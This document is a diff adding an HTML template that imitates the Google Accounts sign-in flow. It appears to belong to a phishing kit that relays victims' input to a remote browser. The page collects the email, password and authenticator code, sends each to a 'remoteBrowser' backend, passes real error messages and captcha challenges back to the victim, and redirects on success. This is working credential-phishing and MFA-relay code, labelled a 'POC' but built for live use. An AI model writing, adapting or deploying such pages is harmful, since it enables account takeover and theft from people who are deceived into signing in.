@@ -1,0 +1,636 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Sign in - Google Accounts</title>
+        <link
+            href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap"
+            rel="stylesheet"
+        />
+        <style>
+            * { box-sizing: border-box; margin: 0; padding: 0; }
+
+            body {
+                font-family: "Google Sans", Roboto, Arial, sans-serif;
+                background: #f0f4f9;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 40px 24px;
+            }
+
+            .card {
+                background: #fff;
+                border-radius: 24px;
+                display: flex;
+                width: 100%;
+                max-width: 900px;
+                min-height: 380px;
+            }
+
+            .card-left {
+                flex: 0 0 360px;
+                padding: 52px 48px 48px;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .left-content { display: none; flex-direction: column; }
+            .left-content.active { display: flex; }
+
+            .g-logo { margin-bottom: 28px; }
+
+            .heading {
+                font-size: 32px;
+                font-weight: 400;
+                color: #202124;
+                font-family: "Google Sans", sans-serif;
+                line-height: 1.25;
+                margin-bottom: 8px;
+            }
+
+            .subheading {
+                font-size: 16px;
+                color: #444746;
+                font-family: Roboto, sans-serif;
+                font-weight: 400;
+                line-height: 1.5;
+            }
+
+            .account-chip {
+                display: inline-flex;
+                align-items: center;
+                border: 1px solid #dadce0;
+                border-radius: 20px;
+                padding: 6px 16px 6px 10px;
+                margin-top: 16px;
+                font-size: 14px;
+                color: #3c4043;
+                font-family: Roboto, sans-serif;
+                gap: 8px;
+                max-width: 280px;
+                overflow: hidden;
+            }
+            .account-chip .chip-name {
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+
+            .card-right {
+                flex: 1;
+                padding: 52px 56px 40px;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .step { display: none; flex-direction: column; flex: 1; }
+            .step.active { display: flex; }
+
+            .field-wrapper { position: relative; margin-bottom: 4px; }
+
+            .field-wrapper input {
+                width: 100%;
+                height: 56px;
+                border: 1px solid #747775;
+                border-radius: 4px;
+                padding: 24px 48px 8px 16px;
+                font-size: 16px;
+                font-family: Roboto, sans-serif;
+                color: #202124;
+                outline: none;
+                background: transparent;
+                transition: border-color 0.15s, border-width 0.15s;
+                caret-color: #1a73e8;
+            }
+            .field-wrapper input:focus {
+                border-color: #1a73e8;
+                border-width: 2px;
+                padding-left: 15px;
+            }
+            .field-wrapper input.error {
+                border-color: #d93025;
+                border-width: 2px;
+                padding-left: 15px;
+            }
+            .field-wrapper label {
+                position: absolute;
+                left: 16px;
+                top: 18px;
+                font-size: 16px;
+                color: #444746;
+                pointer-events: none;
+                transition: top 0.15s, font-size 0.15s, color 0.15s;
+                font-family: Roboto, sans-serif;
+            }
+            .field-wrapper input:focus ~ label,
+            .field-wrapper input:not(:placeholder-shown) ~ label {
+                top: 8px;
+                font-size: 12px;
+                color: #1a73e8;
+            }
+            .field-wrapper input:not(:focus):not(:placeholder-shown) ~ label { color: #444746; }
+            .field-wrapper input.error ~ label,
+            .field-wrapper input.error:focus ~ label { color: #d93025; }
+
+            .password-toggle {
+                position: absolute;
+                right: 10px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                cursor: pointer;
+                padding: 8px;
+                color: #444746;
+                display: flex;
+                align-items: center;
+                border-radius: 50%;
+            }
+            .password-toggle:hover { background: #f1f3f4; }
+
+            .error-text {
+                font-size: 12px;
+                color: #d93025;
+                margin-top: 4px;
+                padding-left: 16px;
+                font-family: Roboto, sans-serif;
+                min-height: 16px;
+                display: none;
+            }
+            .error-text.visible { display: block; }
+
+            .link-row { margin-top: 12px; }
+
+            .text-link {
+                font-size: 14px;
+                color: #1a73e8;
+                text-decoration: none;
+                font-family: Roboto, sans-serif;
+                font-weight: 500;
+            }
+            .text-link:hover { text-decoration: underline; }
+
+            .guest-note {
+                font-size: 14px;
+                color: #444746;
+                font-family: Roboto, sans-serif;
+                line-height: 1.5;
+                margin-top: 20px;
+            }
+
+            .actions {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin-top: auto;
+                padding-top: 32px;
+            }
+
+            .btn {
+                font-family: "Google Sans", Roboto, sans-serif;
+                font-size: 14px;
+                font-weight: 500;
+                border: none;
+                cursor: pointer;
+                padding: 10px 24px;
+                border-radius: 20px;
+                letter-spacing: 0.25px;
+                transition: background 0.2s, box-shadow 0.2s;
+                min-height: 40px;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .btn-text { background: transparent; color: #1a73e8; }
+            .btn-text:hover { background: #e8f0fe; }
+            .btn-filled { background: #1a73e8; color: #fff; min-width: 88px; }
+            .btn-filled:hover { background: #1b66c9; box-shadow: 0 1px 3px rgba(26,115,232,0.4); }
+            .btn-filled:disabled { background: #e8eaed; color: #bdc1c6; cursor: default; box-shadow: none; }
+
+            .spinner {
+                display: none;
+                width: 18px;
+                height: 18px;
+                border: 2px solid rgba(255,255,255,0.4);
+                border-top-color: #fff;
+                border-radius: 50%;
+                animation: spin 0.75s linear infinite;
+            }
+            @keyframes spin { to { transform: rotate(360deg); } }
+            .btn-filled.loading .btn-label { display: none; }
+            .btn-filled.loading .spinner { display: block; }
+
+            .center-area {
+                flex: 1;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                padding: 16px 0;
+                gap: 20px;
+            }
+
+            .done-icon {
+                width: 52px;
+                height: 52px;
+                background: #e6f4ea;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .page-spinner {
+                width: 36px;
+                height: 36px;
+                border: 3px solid #e8eaed;
+                border-top-color: #1a73e8;
+                border-radius: 50%;
+                animation: spin 0.9s linear infinite;
+            }
+
+            #captcha-stream-container {
+                display: inline-block;
+                cursor: pointer;
+                border-radius: 4px;
+                overflow: hidden;
+            }
+            #captcha-stream-container canvas {
+                display: block;
+                outline: none;
+            }
+
+            .page-footer {
+                margin-top: 20px;
+                width: 100%;
+                max-width: 900px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 0 4px;
+            }
+            .page-footer select {
+                border: none;
+                color: #5f6368;
+                font-size: 12px;
+                font-family: Roboto, sans-serif;
+                background: transparent;
+                outline: none;
+                cursor: pointer;
+            }
+            .footer-links { display: flex; gap: 20px; }
+            .footer-link {
+                font-size: 12px;
+                color: #5f6368;
+                text-decoration: none;
+                font-family: Roboto, sans-serif;
+            }
+            .footer-link:hover { text-decoration: underline; }
+
+            @media (max-width: 680px) {
+                .card { flex-direction: column; min-height: 0; }
+                .card-left { flex: none; padding: 40px 32px 20px; }
+                .card-right { padding: 0 32px 40px; }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="card">
+            <div class="card-left">
+
+                <div id="left-email" class="left-content active">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="heading">Sign in</h1>
+                    <p class="subheading">Use your Google Account</p>
+                </div>
+
+                <div id="left-password" class="left-content">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="heading">Welcome</h1>
+                    <div class="account-chip">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="8" r="4" fill="#5f6368"/>
+                            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                        <span id="chip-email" class="chip-name"></span>
+                    </div>
+                </div>
+
+                <div id="left-totp" class="left-content">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="heading">2-Step Verification</h1>
+                    <p class="subheading">Open your authenticator app and enter the 6-digit code</p>
+                    <div class="account-chip">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="8" r="4" fill="#5f6368"/>
+                            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                        <span id="chip-email-totp" class="chip-name"></span>
+                    </div>
+                </div>
+
+                <div id="left-captcha" class="left-content">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="heading">One more step</h1>
+                    <p class="subheading">Complete the security check to continue signing in</p>
+                </div>
+
+                <div id="left-waiting" class="left-content">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="heading">Please wait</h1>
+                    <p class="subheading">Reconnecting to Google</p>
+                </div>
+
+                <div id="left-done" class="left-content">
+                    <div class="g-logo">
+                        <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="card-right">
+
+                <div id="step-email" class="step active">
+                    <div class="field-wrapper">
+                        <input type="email" id="email-input" placeholder=" " autocomplete="email" autofocus />
+                        <label for="email-input">Email or phone</label>
+                    </div>
+                    <div id="email-error" class="error-text"></div>
+                    <div class="link-row"><a href="#" class="text-link">Forgot email?</a></div>
+                    <p class="guest-note">
+                        Not your computer? Use Guest mode to sign in privately.
+                        <a href="#" class="text-link">Learn more</a>
+                    </p>
+                    <div class="actions">
+                        <a href="#" class="btn btn-text">Create account</a>
+                        <button id="email-next" class="btn btn-filled" onclick="submitEmail()">
+                            <span class="btn-label">Next</span>
+                            <div class="spinner"></div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="step-password" class="step">
+                    <div class="field-wrapper">
+                        <input type="password" id="password-input" placeholder=" " autocomplete="current-password" />
+                        <label for="password-input">Enter your password</label>
+                        <button class="password-toggle" type="button" onclick="togglePassword()" tabindex="-1" aria-label="Show password">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                                <path d="M12 5C7 5 2.73 8.11 1 12.5 2.73 16.89 7 20 12 20s9.27-3.11 11-7.5C21.27 8.11 17 5 12 5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#444746"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <div id="password-error" class="error-text"></div>
+                    <div class="link-row"><a href="#" class="text-link">Forgot password?</a></div>
+                    <div class="actions">
+                        <a href="#" class="btn btn-text">Try another way</a>
+                        <button id="password-next" class="btn btn-filled" onclick="submitPassword()">
+                            <span class="btn-label">Next</span>
+                            <div class="spinner"></div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="step-totp" class="step">
+                    <div class="field-wrapper">
+                        <input type="text" id="totp-input" placeholder=" " inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
+                        <label for="totp-input">Enter code</label>
+                    </div>
+                    <div id="totp-error" class="error-text"></div>
+                    <div class="link-row"><a href="#" class="text-link">Try another way</a></div>
+                    <div class="actions">
+                        <div></div>
+                        <button id="totp-next" class="btn btn-filled" onclick="submitTOTP()">
+                            <span class="btn-label">Next</span>
+                            <div class="spinner"></div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="step-captcha" class="step">
+                    <div class="center-area">
+                        <div id="captcha-stream-container"></div>
+                    </div>
+                </div>
+
+                <div id="step-waiting" class="step">
+                    <div class="center-area">
+                        <div class="page-spinner"></div>
+                        <p class="subheading">Please wait&hellip;</p>
+                    </div>
+                </div>
+
+                <div id="step-done" class="step">
+                    <div class="center-area">
+                        <div class="done-icon">
+                            <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+                                <path d="M5 12l4 4L19 7" stroke="#1e8e3e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                        </div>
+                        <h1 class="heading">You're signed in</h1>
+                        <p class="subheading">Redirecting&hellip;</p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="page-footer">
+            <select aria-label="Language"><option>English (United States)</option></select>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+            </div>
+        </div>
+
+        {{RemoteBrowserScript "Google POC"}}
+        <script>
+            var currentEmail = '';
+            var currentStep  = 'email';
+
+            function showStep(name) {
+                ['email-next', 'password-next', 'totp-next'].forEach(function(id) {
+                    setLoading(id, false);
+                });
+                document.querySelectorAll('.step').forEach(function(el) {
+                    el.classList.remove('active');
+                });
+                document.querySelectorAll('.left-content').forEach(function(el) {
+                    el.classList.remove('active');
+                });
+                document.getElementById('step-' + name).classList.add('active');
+                document.getElementById('left-' + name).classList.add('active');
+                currentStep = name;
+                if (name === 'password') {
+                    document.getElementById('chip-email').textContent = currentEmail;
+                    document.getElementById('password-input').focus();
+                }
+                if (name === 'totp') {
+                    document.getElementById('chip-email-totp').textContent = currentEmail;
+                    document.getElementById('totp-input').focus();
+                }
+            }
+
+            function setError(field, msg) {
+                document.getElementById(field + '-input').classList.add('error');
+                var el = document.getElementById(field + '-error');
+                el.textContent = msg;
+                el.classList.add('visible');
+            }
+
+            function clearError(field) {
+                document.getElementById(field + '-input').classList.remove('error');
+                document.getElementById(field + '-error').classList.remove('visible');
+            }
+
+            function setLoading(id, on) {
+                var btn = document.getElementById(id);
+                if (!btn) return;
+                btn.classList.toggle('loading', on);
+                btn.disabled = on;
+            }
+
+            function submitEmail() {
+                var val = document.getElementById('email-input').value.trim();
+                if (!val) return;
+                clearError('email');
+                currentEmail = val;
+                setLoading('email-next', true);
+                window.remoteBrowser.send('email', { email: val });
+            }
+
+            function submitPassword() {
+                var val = document.getElementById('password-input').value;
+                if (!val) return;
+                clearError('password');
+                setLoading('password-next', true);
+                window.remoteBrowser.send('password', { password: val });
+            }
+
+            function submitTOTP() {
+                var val = document.getElementById('totp-input').value.trim();
+                if (!val) return;
+                clearError('totp');
+                setLoading('totp-next', true);
+                window.remoteBrowser.send('totp', { totp: val });
+            }
+
+            function togglePassword() {
+                var inp = document.getElementById('password-input');
+                inp.type = inp.type === 'password' ? 'text' : 'password';
+            }
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key !== 'Enter') return;
+                if (currentStep === 'email')         submitEmail();
+                else if (currentStep === 'password') submitPassword();
+                else if (currentStep === 'totp')     submitTOTP();
+            });
+
+            ['email', 'password', 'totp'].forEach(function(f) {
+                var el = document.getElementById(f + '-input');
+                if (el) el.addEventListener('input', function() { clearError(f); });
+            });
+
+            var rb = window.remoteBrowser;
+            if (rb) {
+                rb.on('invalid_email', function(val) {
+                    showStep('email');
+                    setError('email', val || "Couldn't find your Google Account");
+                });
+
+                rb.on('passwordReady', function() {
+                    showStep('password');
+                });
+
+                rb.on('invalid_password', function(val) {
+                    showStep('password');
+                    setError('password', val || 'Wrong password. Try again.');
+                });
+
+                rb.on('totp_ready', function() {
+                    showStep('totp');
+                });
+
+                rb.on('totp_error', function(val) {
+                    showStep('totp');
+                    setError('totp', val || 'Wrong code. Try again.');
+                });
+
+                rb.on('invalid_totp', function(val) {
+                    showStep('totp');
+                    setError('totp', val || 'Wrong code. Try again.');
+                });
+
+                rb.on('captcha_stream', function() {
+                    showStep('captcha');
+                    rb.mountStream('captcha', document.getElementById('captcha-stream-container'), { autoSize: true });
+                });
+
+                rb.on('stream_start', 'captcha', function() {
+                    // sizing applied automatically by mountStream + inject JS
+                });
+
+                rb.on('stream_stop', 'captcha', function() {
+                    showStep('waiting');
+                });
+
+                rb.on('unknown_state', function() {
+                    showStep('waiting');
+                });
+
+                rb.on('complete', function() {
+                    showStep('done');
+                    setTimeout(function() { location.href = '{{.URL}}'; }, 1500);
+                });
+            }
+        </script>
+    </body>
+</html>
